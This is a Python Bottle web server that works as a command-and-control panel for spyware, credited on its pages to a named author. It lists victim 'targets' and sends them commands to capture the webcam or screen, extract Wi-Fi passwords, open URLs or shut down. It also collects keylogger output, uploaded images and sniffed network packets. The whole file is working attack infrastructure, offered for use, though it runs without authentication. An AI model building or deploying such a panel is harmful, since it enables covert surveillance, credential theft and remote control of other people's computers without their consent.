from bottle import Bottle, run, request, template, static_file
import os
import sqlite3
targets = []  

app = Bottle()
DB_FILE = 'admin_logs.db'
command_data = {"command": None}
wifi_results = []
terminate_data = {"terminate": False}  
packet_data = []


def initialize_db():
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute('CREATE TABLE IF NOT EXISTS logs (timestamp TEXT, key TEXT)')
    conn.commit()
    conn.close()

@app.route("/")
def admin_panel():
    print(f"Current targets: {targets}")  
    return template("""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Targets</title>
        <style>
            @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Roboto:wght@400;500&display=swap');

            body {
                background: radial-gradient(circle at center, #1a1a2e, #16213e, #0f3460, #1b1b2f, #111);
                color: #ffffff;
                font-family: 'Orbitron', 'Roboto', Arial, sans-serif;
                margin: 0; padding: 0; overflow: hidden;
            }

            h1 {
                text-align: center;
                color: #0ff;
                text-shadow: 0 0 30px #0ff, 0 0 60px #0ff;
                margin-top: 30px;
                animation: glow 2s infinite alternate;
            }

            @keyframes glow {
                from { text-shadow: 0 0 20px #0ff; }
                to { text-shadow: 0 0 40px #0ff; }
            }

            .targets {
                list-style: none;
                padding: 0;
                max-width: 500px;
                margin: 50px auto;
            }

            .target {
                margin: 15px;
                padding: 15px;
                background-color: #1c1c1c;
                border-radius: 10px;
                text-align: center;
                cursor: pointer;
                color: #00ffcc;
                text-shadow: 0 0 10px #00ffcc;
                transition: transform 0.3s ease, box-shadow 0.3s ease;
            }

            .target:hover {
                transform: scale(1.1);
                box-shadow: 0 0 20px #00ffcc;
            }

            footer {
                position: fixed;
                bottom: 0;
                width: 100%;
                text-align: center;
                padding: 10px;
                background: rgba(0, 0, 0, 0.5);
                color: #00cccc;
                font-size: 12px;
                text-shadow: 0 0 5px #00ccff;
            }
        </style>
    </head>
    <body>
        <h1>Targets</h1>
        <ul class="targets">
            % for target in targets:
                <li class="target" onclick="navigateTo('/target/{{target['id']}}')">
                    {{target['name']}}
                </li>
            % end
        </ul>
        <footer>
            made by <span style="color: #0ff; font-weight: bold;">Rishabh Shukla</span>
        </footer>
        <script>
            function navigateTo(path) {
                window.location.href = path;
            }
        </script>
    </body>
    </html>
    """, targets=targets)

@app.route('/register_target', method='POST')
def register_target():
    target_data = request.json
    for target in targets:
        if target['name'] == target_data['name'] and target['ip'] == target_data['ip']:
            return {"status": "already_registered", "message": "Target already registered"}
    target_id = len(targets) + 1
    target_data["id"] = target_id
    targets.append(target_data)  

    print(f"New target registered: {target_data}")  
    return {"status": "success", "message": "Target registered successfully"}



@app.route('/target/<target_id>')
def target_command_panel(target_id):
    return template("""
   <!DOCTYPE html>
<html>

<head>
    <title>Admin Panel</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Roboto:wght@400;500&display=swap');

        body {
            background: radial-gradient(circle at center, #1a1a2e, #16213e, #0f3460, #1b1b2f, #111);
            background-size: cover;
            background-attachment: fixed;
            color: #ffffff;
            font-family: 'Orbitron', 'Roboto', Arial, sans-serif;
            margin: 0;
            padding: 0;
            overflow: hidden;
        }

        h1 {
            text-align: center;
            color: #0ff;
            text-shadow: 0 0 30px #0ff, 0 0 60px #0ff;
            margin-top: 30px;
            animation: glow 2s infinite alternate;
        }

        @keyframes glow {
            from {
                text-shadow: 0 0 20px #0ff, 0 0 40px #0ff;
            }

            to {
                text-shadow: 0 0 40px #0ff, 0 0 80px #0ff;
            }
        }

        .info-sec-club {
            text-align: center;
            margin-top: 10px;
            font-size: 1.5rem;
            color: #00ccff;
            text-shadow: 0 0 20px #00ccff, 0 0 30px #00ccff;
            animation: glow 3s infinite alternate;
        }

        .command-section,
        .floating-buttons {
            position: relative;
            z-index: 10;
            text-align: center;
        }

        .command-section {
            padding: 20px;
        }

        .command-section h2 {
            color: #00cccc;
            text-shadow: 0 0 15px #00cccc;
            margin-bottom: 20px;
            font-weight: bold;
            text-transform: uppercase;
        }

        .command-section button,
        input,
        select {
            margin: 10px;
            padding: 10px;
            border-radius: 8px;
            font-size: 14px;
            transition: all 0.3s ease-in-out;
        }

        .command-section button {
            background: linear-gradient(135deg, #0ff, #0077ff);
            color: #000;
            border: none;
            font-weight: bold;
            text-transform: uppercase;
            box-shadow: 0 0 20px #00ccff, 0 0 40px #00ccff;
            cursor: pointer;
        }

        .command-section button:hover {
            transform: translateY(-5px) scale(1.05);
            background: linear-gradient(135deg, #00ccff, #0ff);
            box-shadow: 0 0 25px #00ccff, 0 0 50px #00ccff;
        }

        input,
        select {
            border: 1px solid #00cccc;
            background-color: #1c1c1c;
            color: #0ff;
            width: calc(100% - 40px);
            max-width: 400px;
            text-align: center;
        }

        .floating-buttons {
            position: fixed;
            bottom: 20px;
            right: 20px;
            display: flex;
            flex-direction: column;
            gap: 15px;
        }

        .floating-buttons button {
            background: linear-gradient(135deg, #0077ff, #0ff);
            border: none;
            color: #000;
            font-size: 18px;
            padding: 15px;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            cursor: pointer;
            transition: all 0.3s ease-in-out;
            box-shadow: 0 0 15px #00ccff, 0 0 25px #00ccff;
        }

        .floating-buttons button:hover {
            transform: scale(1.15) rotate(10deg);
            background: linear-gradient(135deg, #0ff, #0077ff);
            box-shadow: 0 0 30px #00ccff, 0 0 60px #00ccff;
        }

        footer {
            position: fixed;
            bottom: 0;
            width: 100%;
            text-align: center;
            padding: 10px;
            background: rgba(0, 0, 0, 0.5);
            color: #00cccc;
            font-size: 12px;
            text-shadow: 0 0 5px #00ccff;
            font-family: 'Roboto', Arial, sans-serif;
        }
    </style>
</head>

<body>
    <h1>Admin Panel</h1>
    <div class="info-sec-club">
        InfoSec
    </div>
    <div class="command-section">
        <h2>Commands</h2>
        <button onclick="sendCommand('capture')">Capture Webcam</button>
        <button onclick="sendCommand('screenshot')">Capture Screenshot</button>
        <button onclick="sendCommand('extract_wifi_passwords')">Extract Wi-Fi Passwords</button>
        <button onclick="sendCommand('shutdown')">Shut Down Target</button>
        <button onclick="openUrl()">Open URL</button>
        <button onclick="terminateConnection()">Terminate Connection</button>
        <input id="urlInput" type="text" placeholder="Enter URL" />
    </div>

    <div class="command-section">
        <h2>Network Sniffing</h2>
        <form action="/filter" method="post"
            style="display: flex; flex-wrap: wrap; justify-content: center; gap: 15px;">
            <select name="type" id="type" style="flex: 1; max-width: 200px;">
                <option value="">All</option>
                <option value="ARP">ARP</option>
                <option value="DNS">DNS</option>
                <option value="HTTP">HTTP</option>
            </select>
            <input type="text" name="source" id="source" placeholder="Source IP (e.g., 192.168.1.1)"
                style="flex: 1; max-width: 200px;">
            <input type="text" name="destination" id="destination" placeholder="Destination IP (e.g., 192.168.1.2)"
                style="flex: 1; max-width: 200px;">
            <button type="submit" style="flex-basis: 100%; max-width: 150px;">Filter Packets</button>
        </form>
        <button onclick="navigateTo('/capture')">View All Packets</button>
        <button onclick="navigateTo('/stats')">View Statistics</button>
    </div>


    <div class="floating-buttons">
        <button onclick="navigateTo('/keylogs')" title="Keylogger Logs">🗒️</button>
        <button onclick="navigateTo('/uploads')" title="Uploaded Files">📁</button>
        <button onclick="navigateTo('/wifi_results')" title="Wi-Fi Results">📡</button>
    </div>
    <footer>
        made by <span style="color: #0ff; font-weight: bold;">Rishabh Shukla</span>
    </footer>
    <script>
        function sendCommand(command) {
            fetch('/command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ command: command })
            }).then(response => {
                if (response.ok) {
                    alert('Command sent successfully!');
                } else {
                    alert('Failed to send command.');
                }
            }).catch(error => {
                alert('Error: ' + error.message);
            });
        }

        function openUrl() {
            const url = document.getElementById("urlInput").value;
            if (url) {
                sendCommand('open_url:' + url);
            } else {
                alert('Please enter a valid URL.');
            }
        }

        function terminateConnection() {
            fetch('/terminate_status', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ terminate: true })
            }).then(response => {
                if (response.ok) {
                    alert('Termination command sent successfully!');
                } else {
                    alert('Failed to send termination command.');
                }
            }).catch(error => {
                alert('Error: ' + error.message);
            });
        }

        function navigateTo(path) {
            window.location.href = path;
        }
    </script>
</body>

</html>
    """, target_id=target_id)

@app.route('/keylogs')
def view_keylogs():
    keylogs = get_keylogs()
    return template("""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Keylogger Logs</title>
        <style>
            body {
                background-color: #121212;
                color: #ffffff;
                font-family: 'Roboto', Arial, sans-serif;
            }
            h1 {
                text-align: center;
                color: #00ffcc;
            }
            ul {
                list-style-type: none;
                padding: 0;
            }
            li {
                background-color: #1f1f1f;
                margin: 5px 0;
                padding: 10px;
                border-radius: 5px;
            }
        </style>
    </head>
    <body>
        <h1>Keylogger Logs</h1>
        <ul>
            % for timestamp, key in keylogs:
                <li>{{timestamp}}: {{key}}</li>
            % end
        </ul>
        <button onclick="window.history.back()">Back</button>
    </body>
    </html>
    """, keylogs=keylogs)

@app.route('/uploads')
def view_uploads():
    try:
        files = os.listdir('uploaded_images')
    except FileNotFoundError:
        files = []
    return template("""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Uploaded Files</title>
        <style>
            body {
                background-color: #121212;
                color: #ffffff;
                font-family: 'Roboto', Arial, sans-serif;
            }
            h1 {
                text-align: center;
                color: #00ffcc;
            }
            ul {
                list-style-type: none;
                padding: 0;
            }
            li {
                background-color: #1f1f1f;
                margin: 5px 0;
                padding: 10px;
                border-radius: 5px;
            }
            a {
                color: #00ffcc;
                text-decoration: none;
            }
            a:hover {
                text-decoration: underline;
            }
        </style>
    </head>
    <body>
        <h1>Uploaded Files</h1>
        <ul>
            % for uploaded_file in files:
                <li><a href="/uploaded/{{uploaded_file}}">{{uploaded_file}}</a></li>
            % end
        </ul>
        <button onclick="window.history.back()">Back</button>
    </body>
    </html>
    """, files=files)

@app.route('/wifi_results')
def view_wifi_results():
    return template("""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Wi-Fi Results</title>
        <style>
            body {
                background-color: #121212;
                color: #ffffff;
                font-family: 'Roboto', Arial, sans-serif;
            }
            h1 {
                text-align: center;
                color: #00ffcc;
            }
            pre {
                background-color: #1f1f1f;
                padding: 10px;
                border-radius: 5px;
                overflow-x: auto;
            }
        </style>
    </head>
    <body>
        <h1>Wi-Fi Results</h1>
        <pre>{{results}}</pre>
        <button onclick="window.history.back()">Back</button>
    </body>
    </html>
    """, results="\n".join(wifi_results))


@app.route('/command', method=['GET', 'POST'])
def handle_command():
    global command_data
    if request.method == 'POST':
        command_data['command'] = request.json.get('command')
        return {"status": "success"}
    return command_data

@app.route('/upload', method='POST')
def handle_upload():
    upload = request.files.get('file')
    if upload:
        save_dir = "uploaded_images"
        os.makedirs(save_dir, exist_ok=True)
        upload.save(os.path.join(save_dir, upload.filename))
        return {"status": "success"}
    return {"status": "failed"}

@app.route('/receive_wifi_data', method='POST')
def receive_wifi_data():
    global wifi_results
    result = request.forms.get('result')
    wifi_results.append(result)
    return "Wi-Fi Data Received"

@app.route("/terminate_status", method=["GET", "POST"])
def handle_terminate():
    global terminate_data
    if request.method == "POST":
        terminate_data["terminate"] = request.json.get("terminate", False)
        return {"status": "success"}
    return terminate_data
  

@app.route('/log_upload', method='POST')
def upload_logs():
    try:
        data = request.json
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.executemany('INSERT INTO logs (timestamp, key) VALUES (?, ?)', data)
        conn.commit()
        conn.close()
        return {"status": "Logs received"}
    except Exception as e:
        return {"status": f"Error: {e}"}

@app.route('/uploaded/<filename>')
def serve_file(filename):
    return static_file(filename, root='./uploaded_images')

def get_keylogs():
    """Retrieve keylogger logs from the database."""
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM logs')
        logs = cursor.fetchall()
        conn.close()
        return logs
    except Exception as e:
        print(f"Error retrieving logs: {e}")
        return []


@app.route('/capture')
def capture_packets():
    
    return render_packet_table(packet_data, "All Captured Packets")

@app.route('/filter', method='POST')
def filter_packets():
    
    packet_type = request.forms.get('type')
    source = request.forms.get('source')
    destination = request.forms.get('destination')

    
    filtered_data = [
        packet for packet in packet_data
        if (not packet_type or packet['Type'] == packet_type) and
           (not source or packet['Source'] == source) and
           (not destination or packet['Destination'] == destination)
    ]
    return render_packet_table(filtered_data, "Filtered Packets")

@app.route('/stats')
def packet_statistics():
    total_packets = len(packet_data)
    arp_count = sum(1 for packet in packet_data if packet['Type'] == 'ARP')
    dns_count = sum(1 for packet in packet_data if packet['Type'] == 'DNS')
    http_count = sum(1 for packet in packet_data if packet['Type'] == 'HTTP')

    return template("""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Packet Statistics</title>
        <style>
            body { background: radial-gradient(circle, #1a1a2e, #16213e); color: #fff; font-family: 'Orbitron', 'Roboto', Arial, sans-serif; margin: 0; padding: 0; }
            h1 { text-align: center; color: #0ff; text-shadow: 0 0 30px #0ff; margin: 20px 0; }
            table { width: 80%; margin: 20px auto; border-collapse: collapse; background-color: #1f1f1f; box-shadow: 0 0 20px #00cccc; }
            th, td { padding: 15px; text-align: center; color: #00ffcc; border: 1px solid #00cccc; }
            th { background-color: #0f3460; font-size: 18px; }
            td { font-size: 16px; }
            a { color: #00ffcc; text-decoration: none; margin: 20px auto; display: block; text-align: center; font-size: 18px; }
            a:hover { text-shadow: 0 0 10px #00ffcc; }
        </style>
    </head>
    <body>
        <h1>Packet Statistics</h1>
        <table>
            <tr><th>Statistic</th><th>Value</th></tr>
            <tr><td>Total Packets Captured</td><td>{{total_packets}}</td></tr>
            <tr><td>ARP Packets</td><td>{{arp_count}}</td></tr>
            <tr><td>DNS Packets</td><td>{{dns_count}}</td></tr>
            <tr><td>HTTP Packets</td><td>{{http_count}}</td></tr>
        </table>
        <a href="/">Back</a>
    </body>
    </html>
    """, total_packets=total_packets, arp_count=arp_count, dns_count=dns_count, http_count=http_count)
@app.route('/receive', method='POST')
def receive_packet():
    """Receive JSON packet data from an external source."""
    try:
        packet_wrapper = request.json
        print(f"Received packet: {packet_wrapper}")  

        
        if packet_wrapper and 'packets' in packet_wrapper:
            packets = packet_wrapper['packets']
            
            for packet in packets:
                if all(key in packet for key in ['Type', 'Source', 'Destination', 'Details']):
                    packet_data.append(packet)
                    print(f"Packet added: {packet}")  
                else:
                    print(f"Invalid packet format: {packet}")  
            return {"status": "success", "message": f"{len(packets)} packets received"}
        else:
            print("Invalid packet format received.")  
            return {"status": "error", "message": "Invalid packet format"}
    except Exception as e:
        print(f"Error receiving packet: {e}")  
        return {"status": "error", "message": str(e)}





def render_packet_table(data, title):
    """Generate an HTML table for packet data with consistent styling."""
    rows = ''.join(
        f'''
        <tr>
            <td>{entry.get('Type', 'Unknown')}</td>
            <td>{entry.get('Source', 'Unknown')}</td>
            <td>{entry.get('Destination', 'Unknown')}</td>
            <td>{entry.get('Details', 'No details available')}</td>
        </tr>
        ''' for entry in data if isinstance(entry, dict)
    )
    return f'''
        <!DOCTYPE html>
        <html>
        <head>
            <title>{title}</title>
            <style>
                body {{ 
                    background: radial-gradient(circle, #1a1a2e, #16213e); 
                    color: #fff; 
                    font-family: 'Orbitron', 'Roboto', Arial, sans-serif; 
                    margin: 0; 
                    padding: 0; 
                }}
                h1 {{ 
                    text-align: center; 
                    color: #0ff; 
                    text-shadow: 0 0 30px #0ff; 
                    margin: 20px 0; 
                }}
                table {{ 
                    width: 90%; 
                    margin: 20px auto; 
                    border-collapse: collapse; 
                    background-color: #1f1f1f; 
                    box-shadow: 0 0 20px #00cccc; 
                }}
                th, td {{ 
                    padding: 10px; 
                    text-align: center; 
                    color: #00ffcc; 
                    border: 1px solid #00cccc; 
                }}
                th {{ 
                    background-color: #0f3460; 
                    font-size: 18px; 
                }}
                td {{ 
                    font-size: 16px; 
                }}
                a {{ 
                    color: #00ffcc; 
                    text-decoration: none; 
                    margin: 20px auto; 
                    display: block; 
                    text-align: center; 
                    font-size: 18px; 
                }}
                a:hover {{ 
                    text-shadow: 0 0 10px #00ffcc; 
                }}
            </style>
        </head>
        <body>
            <h1>{title}</h1>
            <table>
                <thead>
                    <tr>
                        <th>Type</th>
                        <th>Source</th>
                        <th>Destination</th>
                        <th>Details</th>
                    </tr>
                </thead>
                <tbody>
                    {rows}
                </tbody>
            </table>
            <a href="/">Back</a>
        </body>
        </html>
    '''


if __name__ == "__main__":
    os.makedirs('uploaded_images', exist_ok=True)
    initialize_db()
    app.run(host='0.0.0.0', port=8080, debug=True)

